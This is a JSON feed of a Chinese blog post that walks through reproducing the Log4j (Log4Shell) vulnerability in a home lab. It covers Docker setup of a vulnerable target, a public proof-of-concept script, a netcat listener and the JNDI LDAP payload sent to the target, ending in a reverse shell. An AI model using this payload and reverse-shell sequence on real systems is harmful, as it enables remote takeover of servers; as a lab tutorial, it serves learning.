{
    "version": "https://jsonfeed.org/version/1",
    "title": "月のブログ",
    "subtitle": "时光如白驹过隙",
    "icon": "https://mo-onstudy.com/images/favicon.ico",
    "description": "",
    "home_page_url": "https://mo-onstudy.com",
    "items": [
        {
            "id": "https://mo-onstudy.com/2021/12/19/Log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "https://mo-onstudy.com/2021/12/19/Log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "Log4j漏洞复现",
            "date_published": "2021-12-19T14:36:41.000Z",
            "content_html": "<h1 id=\"log4j漏洞复现\"><a class=\"anchor\" href=\"#log4j漏洞复现\">#</a> Log4j 漏洞复现</h1>\n<h2 id=\"漏洞复现环境介绍\"><a class=\"anchor\" href=\"#漏洞复现环境介绍\">#</a> 漏洞复现环境介绍</h2>\n<p>局域网</p>\n<p>攻击机器：MacOS BigSur</p>\n<p>攻击 IP：192.168.1.9</p>\n<p>目标机器：Centos7</p>\n<p>目标 IP：192.168.1.16</p>\n<h2 id=\"前期准备\"><a class=\"anchor\" href=\"#前期准备\">#</a> 前期准备</h2>\n<h3 id=\"目标机器安装docker\"><a class=\"anchor\" href=\"#目标机器安装docker\">#</a> 目标机器安装 Docker</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>Centos7安装Docker</span><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNzAxNDUx\">参考链接</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#更新 yum 包</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yum -y update </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#卸载旧版本（如果之前安装过的话） </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>yum remove docker docker-common docker-selinux docker-engine </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#安装需要的软件包 </span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>yum <span class=\"token function\">install</span> -y yum-utils device-mapper-persistent-data lvm2 </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#设置 yum 源 </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>yum-config-manager --add-repo http://download.docker.com/linux/centos/docker-ce.repo（中央仓库） </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo（阿里仓库） </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#查看可用版本 </span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>yum list docker-ce --showduplicates <span class=\"token operator\">|</span> <span class=\"token function\">sort</span> -r </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#安装 docker </span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>yum -y <span class=\"token function\">install</span> docker-ce-18.03.1.ce</pre></td></tr></table></figure><p>附一些 docker 常用命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>Docker常用命令</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#启动 docker 服务           </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>systemctl start docker</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#重启 docker 服务   </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>systemctl restart  docker</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#关闭 docker 服务   </span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>systemctl stop docker</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#镜像搭建容器</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>docker run -dt --name <span class=\"token string\">'自定义容器名称'</span> -p <span class=\"token number\">80</span>:80 --rm <span class=\"token string\">'镜像名称'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#查看所有容器</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>docker <span class=\"token function\">ps</span> -a    </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#进入容器</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>docker <span class=\"token builtin class-name\">exec</span> -it 容器ID /bin/bash    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>docker <span class=\"token builtin class-name\">exec</span> -it 容器ID /bin/sh   </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#开启容器</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>docker start 容器ID    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#停止容器</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>docker stop 容器ID       </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#删除容器</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>docker <span class=\"token function\">rm</span> 容器ID         </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#删除镜像</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>docker rmi 容器ID</pre></td></tr></table></figure><h3 id=\"目标机器搭建漏洞靶场\"><a class=\"anchor\" href=\"#目标机器搭建漏洞靶场\">#</a> 目标机器搭建漏洞靶场</h3>\n<p>参照<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjYzMTMy\"> Log4J 漏洞复现 + 漏洞靶场</span>，依次执行命令。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>docker搭建靶场环境</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#拉取 docker 镜像</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#根据镜像搭建容器</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>docker run -it -d -p <span class=\"token number\">8080</span>:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#进入容器</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>docker <span class=\"token builtin class-name\">exec</span> -it log4j_vuln_container /bin/bash</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#运行 apache 服务</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh</pre></td></tr></table></figure><p>访问漏洞靶场地址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS4xNjo4MDgwL3dlYnN0dWR5Lw==\">http://192.168.1.16:8080/webstudy/</span></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-17_14-33-02%20(1).jpg\" alt=\"2021-12-17_14-33-02 (1)\" /></p>\n<h3 id=\"攻击机器下载配置poc\"><a class=\"anchor\" href=\"#攻击机器下载配置poc\">#</a> 攻击机器下载配置 poc</h3>\n<p>下载 poc 项目：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tvem1lcg==\">kozmer</span>/<strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tvem1lci9sb2c0ai1zaGVsbC1wb2M=\">log4j-shell-poc</span></strong></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-17_14-33-02%20(2).jpg\" alt=\"2021-12-17_14-33-02 (2)\" /></p>\n<p>安装 poc.py 运行所需 python 包</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pip3 <span class=\"token function\">install</span> colorama</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>pip3 <span class=\"token function\">install</span> argparse</pre></td></tr></table></figure><p>poc.py 运行需调用 Java1.8，已安装 JDK 的情况下，修改 poc.py 中 Java_Home 路径为本地路径</p>\n<div class=\"note info\">\n<p>poc 项目已被更新，实际脚本代码与本文截图会略有不同</p>\n</div>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-17_14-58-26.jpg\" alt=\"2021-12-17_14-58-26\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-17_14-48-44.jpg\" alt=\"2021-12-17_14-48-44\" /></p>\n<h2 id=\"漏洞复现\"><a class=\"anchor\" href=\"#漏洞复现\">#</a> 漏洞复现</h2>\n<p>目标机器：已运行漏洞靶场环境</p>\n<p>攻击机器：运行 poc.py 脚本，并新开启一个终端设置监听，这里攻击 IP 为 192.168.1.9，http 服务端口为 8000，反弹 shell（监听）端口为 9001</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>运行poc.py</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#运行 poc.py</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>python3 poc.py --userip <span class=\"token number\">192.168</span>.1.9 --webport <span class=\"token number\">8000</span> --lport <span class=\"token number\">9001</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#新开 shell 窗口并设置监听</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">nc</span> -lvn <span class=\"token number\">9001</span></pre></td></tr></table></figure><p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-17_17-32-03%20(1).jpg\" alt=\"2021-12-17_17-32-03 (1)\" /></p>\n<p>访问 http://192.168.1.16:8080/webstudy/，点击 hit me 提示我们用 post 请求，使用 hackbar 来发送 post 请求，这里漏洞靶场的 post 请求参数为 c，我们发送 <code>c=$&#123;jndi:ldap://192.168.1.9:1389/a&#125;</code></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-17_17-32-03%20(3).jpg\" alt=\"2021-12-17_17-32-03 (3)\" /></p>\n<p>查看监听，成功反弹 shell</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/2021-12-17_17-32-03%20(4).jpg\" alt=\"2021-12-17_17-32-03 (4)\" /></p>\n<p>希望大家复现成功！</p>\n",
            "tags": [
                "Log4j"
            ]
        }
    ]
}